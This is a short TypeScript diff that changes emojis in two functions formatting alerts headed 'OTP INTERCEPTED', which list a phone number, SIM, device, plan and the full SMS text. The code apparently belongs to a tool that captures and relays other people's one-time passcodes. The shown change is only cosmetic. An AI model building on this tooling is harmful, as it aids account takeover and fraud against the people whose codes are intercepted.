@@ -175,13 +175,13 @@ function formatTime(ts: string): string {
 function formatOtpMessage(sms: SmsMessage): string {
   const otp = extractOtp(sms.body)!;
   return (
-    `${ce("🎁")} <b>OTP INTERCEPTED</b> ${ce("🎁")}\n` +
+    `${ce("🚨")} <b>OTP INTERCEPTED</b> ${ce("🚨")}\n` +
     `——————————————————————\n\n` +
     `╭─ ${ce("✨")} <b>DETAILS</b>\n` +
     `├ ${ce("📲")} <b>Phone:</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
     `├ ${ce("🔔")} <b>Time:</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
     `├ ${ce("🃏")} <b>SIM:</b>     ${escapeHtml(sms.sim)}\n` +
-    `├ ${ce("🖥")} <b>Device:</b>  ${escapeHtml(sms.device)}\n` +
+    `├ ${ce("💻")} <b>Device:</b>  ${escapeHtml(sms.device)}\n` +
     `╰ ${ce("💵")} <b>Plan:</b>    ${escapeHtml(sms.plan)}\n\n` +
     `╭─ ${ce("💬")} <b>MESSAGE</b>\n` +
     `╰ <i>${escapeHtml(sms.body)}</i>\n\n` +
@@ -199,7 +199,7 @@ function formatSmsMessage(sms: SmsMessage): string {
     `├ ${ce("📲")} <b>Phone:</b>   <code>${escapeHtml(sms.phone)}</code>\n` +
     `├ ${ce("🔔")} <b>Time:</b>    ${escapeHtml(formatTime(sms.timestamp))}\n` +
     `├ ${ce("🃏")} <b>SIM:</b>     ${escapeHtml(sms.sim)}\n` +
-    `├ ${ce("🖥")} <b>Device:</b>  ${escapeHtml(sms.device)}\n` +
+    `├ ${ce("💻")} <b>Device:</b>  ${escapeHtml(sms.device)}\n` +
     `╰ ${ce("💵")} <b>Plan:</b>    ${escapeHtml(sms.plan)}\n\n` +
     `╭─ ${ce("💬")} <b>MESSAGE</b>\n` +
     `╰ <i>${escapeHtml(sms.body)}</i>`
